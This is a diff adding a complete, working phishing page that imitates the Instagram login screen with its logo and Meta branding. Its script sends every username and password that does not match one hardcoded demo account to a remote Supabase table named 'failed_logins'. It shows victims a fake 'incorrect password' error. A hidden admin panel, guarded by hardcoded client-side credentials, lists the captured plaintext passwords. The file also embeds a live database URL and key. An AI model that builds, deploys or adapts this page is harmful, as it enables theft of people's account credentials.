@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Instagram Login</title>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.45.4/dist/umd/supabase.js"></script>
+<style>
+:root{
+  --bg:#121212; --surface:#121212; --ink:#fafafa; --muted:#8e8e8e; --line:#363636;
+  --accent:#0095f6; --accent-dim:#01528c;
+  box-sizing:border-box; padding-top:env(safe-area-inset-top,0px); padding-bottom:env(safe-area-inset-bottom,0px);
+  color-scheme:dark;
+}
+*{box-sizing:border-box}
+html{scroll-padding-top:env(safe-area-inset-top,0px)}
+body{margin:0;min-height:100%;background:var(--bg);color:var(--ink);
+  font-family:-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+html,body{height:100%}
+[hidden]{display:none!important}
+
+.wrap{min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:36px 24px 20px}
+.logo{width:88px;height:88px;border-radius:22px;margin:40px 0 44px;
+  background:linear-gradient(135deg,#6228d7 0%,#b721aa 35%,#ee2a7b 60%,#f9814a 85%);
+  display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.logo svg{width:52px;height:52px}
+.logo.small{width:56px;height:56px;margin:0 0 20px;border-radius:16px}
+.logo.small svg{width:32px;height:32px}
+
+form{width:100%;max-width:360px}
+.field{margin-bottom:14px}
+input{width:100%;font:inherit;font-size:1rem;background:transparent;color:var(--ink);
+  border:1px solid var(--line);border-radius:30px;padding:15px 18px;}
+input::placeholder{color:var(--muted)}
+input:focus-visible{outline:2px solid var(--accent);outline-offset:1px}
+.pf-field{position:relative}
+.pf-field input{padding-right:58px}
+.tg{position:absolute;right:6px;top:50%;transform:translateY(-50%);background:none;border:0;
+  color:var(--ink);font:inherit;font-weight:600;font-size:.82rem;padding:8px 10px;cursor:pointer}
+
+.btn{width:100%;margin-top:4px;font:inherit;font-weight:600;font-size:1rem;background:var(--accent);
+  color:#fff;border:0;border-radius:30px;padding:14px;cursor:pointer}
+.btn:disabled{background:var(--accent-dim);color:#8fb8d6;cursor:default}
+
+.err{color:#ed4956;font-size:.85rem;min-height:1.3em;margin:12px 0 0;text-align:center}
+.ok-msg{color:#4fd1a1;font-size:.9rem;text-align:center;margin-top:16px}
+
+.forgot{display:block;text-align:center;color:var(--accent);font-size:.95rem;
+  text-decoration:none;margin:28px 0 48px;background:none;border:0;font-family:inherit;cursor:pointer;width:100%}
+
+.create{width:100%;max-width:360px;display:block;text-align:center;background:none;
+  border:1px solid var(--accent);color:var(--accent);font:inherit;font-weight:600;font-size:1rem;
+  border-radius:30px;padding:13px;cursor:pointer;margin-top:auto}
+
+.meta{display:flex;align-items:center;gap:8px;color:var(--muted);font-size:1.05rem;font-weight:500;
+  margin:36px 0 12px}
+.meta svg{width:22px;height:22px}
+
+/* signup view */
+.signup{display:none;width:100%;max-width:360px;flex-direction:column;flex:1}
+.signup.show{display:flex}
+.signup h2{font-size:1.3rem;margin:48px 0 6px}
+.signup p.sub{color:var(--muted);font-size:.9rem;margin:0 0 24px}
+.back{align-self:flex-start;background:none;border:0;color:var(--ink);font:inherit;font-size:.9rem;
+  cursor:pointer;padding:0;margin-top:20px}
+
+/* admin login view */
+.admwrap{display:none;min-height:100vh;flex-direction:column;align-items:center;justify-content:center;padding:36px 24px}
+.admwrap.show{display:flex}
+.admwrap h1{font-size:1.3rem;margin:0 0 4px}
+.admwrap p.sub{color:var(--muted);font-size:.9rem;margin:0 0 26px}
+.admwrap form{max-width:340px}
+.admwrap label{display:block;font-size:.85rem;color:var(--muted);margin:0 0 6px}
+
+/* admin panel */
+.bar{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:16px;
+  border-bottom:1px solid var(--line);max-width:600px;margin:0 auto}
+.bar strong{font-size:1.05rem}
+.bar span{color:var(--muted);font-size:.8rem;display:block}
+.out{background:none;border:1px solid var(--line);border-radius:6px;padding:7px 14px;font:inherit;
+  font-size:.82rem;color:var(--ink);cursor:pointer}
+.amain{max-width:600px;margin:0 auto;padding:20px 16px}
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:10px;margin-bottom:22px}
+.stat{border:1px solid var(--line);border-radius:8px;padding:12px 14px}
+.stat b{display:block;font-size:1.5rem}
+.stat small{color:var(--muted)}
+.ah2{font-size:1rem;margin:28px 0 10px}
+.ah2:first-of-type{margin-top:0}
+.tw{overflow-x:auto;border:1px solid var(--line);border-radius:8px}
+table{width:100%;border-collapse:collapse;font-size:.85rem}
+th,td{text-align:left;padding:10px 12px;border-bottom:1px solid var(--line);white-space:nowrap}
+tr:last-child td{border-bottom:0}
+th{color:var(--muted);font-weight:600}
+.bad{color:#ed4956;font-weight:600}
+.empty{color:var(--muted);font-size:.85rem;padding:14px;border:1px dashed var(--line);border-radius:8px}
+.loading{color:var(--muted);font-size:.85rem;text-align:center;padding:40px 0}
+.adminlink{position:fixed;bottom:10px;right:12px;font-size:.7rem;color:var(--line);text-decoration:none;opacity:.6}
+</style>
+</head>
+<body>
+
+<div class="wrap" id="loginView">
+  <div class="logo" aria-hidden="true">
+    <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2">
+      <rect x="2" y="2" width="20" height="20" rx="6"/>
+      <circle cx="12" cy="12" r="4.2"/>
+      <circle cx="17.8" cy="6.2" r="0.6" fill="#fff"/>
+    </svg>
+  </div>
+
+  <form id="f" novalidate>
+    <div class="field"><input id="user" type="text" placeholder="Username, email address or mobile number" autocomplete="username"></div>
+    <div class="field pf-field">
+      <input id="pass" type="password" placeholder="Password" autocomplete="current-password">
+      <button type="button" class="tg" id="tg" aria-label="Show password">Show</button>
+    </div>
+    <button class="btn" type="submit" id="go" disabled>Log in</button>
+    <p class="err" id="err" role="alert"></p>
+    <p class="ok-msg" id="okMsg" hidden>Success! You're logged in.</p>
+  </form>
+
+  <button type="button" class="forgot">Forgotten password?</button>
+
+  <button class="create" type="button" id="toSignup">Create new account</button>
+
+  <div class="meta">
+    <svg viewBox="0 0 24 24" fill="currentColor"><path d="M6.5 3C3.5 3 1 7.5 1 12.3 1 15.6 2.5 18 5 18c1.9 0 3.1-1.5 4.8-4.4.5-.9 1.4-2.6 2.2-3.9.7 1.3 1.6 3 2.2 3.9C15.9 16.5 17.1 18 19 18c2.5 0 4-2.4 4-5.7C23 7.5 20.5 3 17.5 3c-1.9 0-3.4 1.4-5.5 4.8C9.9 4.4 8.4 3 6.5 3zm0 2c1 0 2 .8 3.9 3.9-1.8 2.9-2.7 4.1-3.9 4.1-1.1 0-1.8-1.2-1.8-2.9C4.7 7.2 5.6 5 6.5 5zm11 0c.9 0 1.8 2.2 1.8 5.1 0 1.7-.7 2.9-1.8 2.9-1.2 0-2.1-1.2-3.9-4.1C15.5 5.8 16.5 5 17.5 5z"/></svg>
+    Meta
+  </div>
+
+  <a class="adminlink" href="#admin">admin</a>
+</div>
+
+<div class="wrap signup" id="signupView">
+  <button class="back" id="backBtn">&larr; Back</button>
+  <h2>Create a new account</h2>
+  <p class="sub">Demo sign-up form — not connected to a real account.</p>
+  <form id="sf" novalidate>
+    <div class="field"><input id="suUser" type="text" placeholder="Username" autocomplete="username"></div>
+    <div class="field pf-field">
+      <input id="suPass" type="password" placeholder="Set password" autocomplete="new-password">
+      <button type="button" class="tg" id="suTg" aria-label="Show password">Show</button>
+    </div>
+    <button class="btn" type="submit" id="suGo" disabled>Sign up</button>
+  </form>
+  <p class="ok-msg" id="suOk" hidden>Account created. You can go back and log in.</p>
+</div>
+
+<div class="admwrap" id="adminLoginView">
+  <div class="logo small" aria-hidden="true">
+    <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2">
+      <rect x="2" y="2" width="20" height="20" rx="6"/><circle cx="12" cy="12" r="4.2"/>
+      <circle cx="17.8" cy="6.2" r="0.6" fill="#fff"/>
+    </svg>
+  </div>
+  <h1>Admin login</h1>
+  <p class="sub">Sign in to view failed login attempts.</p>
+  <form id="af" novalidate>
+    <div class="field"><label for="auser">Username</label><input id="auser" type="text" autocomplete="username"></div>
+    <div class="field pf-field"><label for="apass">Password</label>
+      <input id="apass" type="password" autocomplete="current-password">
+      <button type="button" class="tg" id="atg" aria-label="Show password">Show</button>
+    </div>
+    <button class="btn" type="submit" id="ago" disabled>Log in</button>
+    <p class="err" id="aerr" role="alert"></p>
+  </form>
+  <button type="button" class="forgot" id="adminBack">&larr; Back to Instagram login</button>
+</div>
+
+<div id="home" hidden>
+  <header class="bar">
+    <div><strong>Admin panel</strong><span id="who"></span></div>
+    <button class="out" id="out">Log out</button>
+  </header>
+  <main class="amain">
+    <div class="stats">
+      <div class="stat" id="failCountStat"><b>0</b><small>Failed logins</small></div>
+    </div>
+
+    <h2 class="ah2">Failed login attempts (Instagram page)</h2>
+    <div id="failWrap">
+      <p class="loading" id="failLoading">Loading…</p>
+      <p class="empty" id="failEmpty" hidden>No failed attempts yet.</p>
+      <div class="tw" id="failTw" hidden>
+        <table>
+          <thead><tr><th>Time</th><th>Username / email entered</th><th>Password entered</th></tr></thead>
+          <tbody id="failBody"></tbody>
+        </table>
+      </div>
+    </div>
+  </main>
+</div>
+
+<script>
+var INSTA={user:"khabibpro",pass:"khabib"};
+var ADMIN={user:"khabibpro",pass:"khabib"};
+var $=function(i){return document.getElementById(i)};
+
+function esc(s){
+  return String(s).replace(/[&<>"']/g,function(c){
+    return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c];
+  });
+}
+
+/* ---- view routing ---- */
+function setView(name){
+  $("loginView").hidden = name!=="login";
+  $("signupView").classList.toggle("show", name==="signup");
+  $("adminLoginView").classList.toggle("show", name==="adminLogin");
+  $("home").hidden = name!=="admin";
+}
+function routeFromHash(){
+  if(location.hash==="#admin"){
+    var loggedIn=false;
+    try{ loggedIn = localStorage.getItem("admin_session_v1")==="1"; }catch(e){}
+    if(loggedIn){ setView("admin"); loadFailedAttempts(); }
+    else{ setView("adminLogin"); }
+  }
+  else { setView("login"); }
+}
+window.addEventListener("hashchange", routeFromHash);
+routeFromHash();
+
+/* ---- failed attempts storage (Supabase: shared across all devices) ---- */
+var SUPABASE_URL = "https://yrmelotlkpkvqmkqntjn.supabase.co";
+var SUPABASE_KEY = "sb_publishable_-xeoaNKTo4aXaamFf3SWbg_0d4WaTuA";
+var sb = null;
+var SB_DEBUG = "";
+try{
+  if(typeof window.supabase === "undefined"){
+    SB_DEBUG = "supabase script did not load";
+  } else {
+    sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+  }
+}catch(e){ sb = null; SB_DEBUG = (e && e.message) ? e.message : String(e); }
+
+async function logFailedAttempt(user, pass){
+  if(!sb) return;
+  try{
+    await sb.from("failed_logins").insert({ username: user, password: pass });
+  }catch(e){ /* network/db issue - fail silently so the login form still works */ }
+}
+
+async function loadFailedAttempts(){
+  if(!sb){
+    $("failLoading").hidden=true; $("failEmpty").hidden=false;
+    $("failEmpty").textContent="Database not connected. " + (SB_DEBUG ? ("("+SB_DEBUG+")") : "");
+    return;
+  }
+  try{
+    var res = await sb.from("failed_logins").select("*").order("created_at", { ascending:false }).limit(200);
+    if(res.error) throw res.error;
+    var list = res.data || [];
+    $("failCountStat").querySelector("b").textContent=list.length;
+    $("failLoading").hidden=true;
+    if(!list.length){ $("failEmpty").hidden=false; $("failTw").hidden=true; return; }
+    $("failEmpty").hidden=true; $("failTw").hidden=false;
+    $("failBody").innerHTML = list.map(function(a){
+      var t = a.created_at ? new Date(a.created_at).toLocaleString() : "";
+      return "<tr><td>"+esc(t)+"</td><td class=\"bad\">"+esc(a.username)+"</td><td class=\"bad\">"+esc(a.password)+"</td></tr>";
+    }).join("");
+  }catch(e){
+    $("failLoading").hidden=true; $("failEmpty").hidden=false;
+    $("failEmpty").textContent="Couldn't load attempts right now: " + ((e && e.message) ? e.message : String(e));
+  }
+}
+
+/* ---- insta login form ---- */
+var u=$("user"),p=$("pass"),go=$("go"),err=$("err"),okMsg=$("okMsg");
+function refresh(){go.disabled=!(u.value.trim()&&p.value);}
+u.oninput=refresh; p.oninput=refresh;
+$("tg").onclick=function(){
+  var hide=p.type==="password"; p.type=hide?"text":"password";
+  this.textContent=hide?"Hide":"Show"; this.setAttribute("aria-label",hide?"Hide password":"Show password");
+};
+$("f").onsubmit=async function(e){
+  e.preventDefault();
+  var name=u.value.trim(),pw=p.value;
+  if(name===INSTA.user&&pw===INSTA.pass){
+    err.textContent=""; okMsg.hidden=false;
+  }else{
+    okMsg.hidden=true;
+    err.textContent="Sorry, your password was incorrect. Please double-check your password.";
+    await logFailedAttempt(name,pw);
+    p.value=""; refresh();
+  }
+};
+
+/* ---- signup view ---- */
+$("toSignup").onclick=function(){ setView("signup"); };
+$("backBtn").onclick=function(){
+  setView("login"); $("sf").reset(); $("suOk").hidden=true; suRefresh();
+};
+var su=$("suUser"),sp=$("suPass"),sg=$("suGo");
+function suRefresh(){sg.disabled=!(su.value.trim()&&sp.value);}
+su.oninput=suRefresh; sp.oninput=suRefresh;
+$("suTg").onclick=function(){
+  var hide=sp.type==="password"; sp.type=hide?"text":"password";
+  this.textContent=hide?"Hide":"Show"; this.setAttribute("aria-label",hide?"Hide password":"Show password");
+};
+$("sf").onsubmit=function(e){ e.preventDefault(); $("suOk").hidden=false; };
+
+/* ---- admin login view ---- */
+var au=$("auser"),ap=$("apass"),ago=$("ago"),aerr=$("aerr");
+function aRefresh(){ago.disabled=!(au.value.trim()&&ap.value);}
+au.oninput=aRefresh; ap.oninput=aRefresh;
+$("atg").onclick=function(){
+  var hide=ap.type==="password"; ap.type=hide?"text":"password";
+  this.textContent=hide?"Hide":"Show"; this.setAttribute("aria-label",hide?"Hide password":"Show password");
+};
+$("adminBack").onclick=function(){ location.hash=""; };
+$("af").onsubmit=function(e){
+  e.preventDefault();
+  var name=au.value.trim(), pw=ap.value;
+  if(name===ADMIN.user && pw===ADMIN.pass){
+    aerr.textContent="";
+    $("who").textContent="Signed in as "+name;
+    try{ localStorage.setItem("admin_session_v1","1"); }catch(e){}
+    setView("admin");
+    loadFailedAttempts();
+  }else{
+    aerr.textContent="Incorrect admin username or password.";
+    ap.value=""; aRefresh();
+  }
+};
+$("out").onclick=function(){
+  au.value=""; ap.value=""; aerr.textContent=""; aRefresh();
+  try{ localStorage.removeItem("admin_session_v1"); }catch(e){}
+  location.hash="";
+};
+</script>
+</body>
+</html>
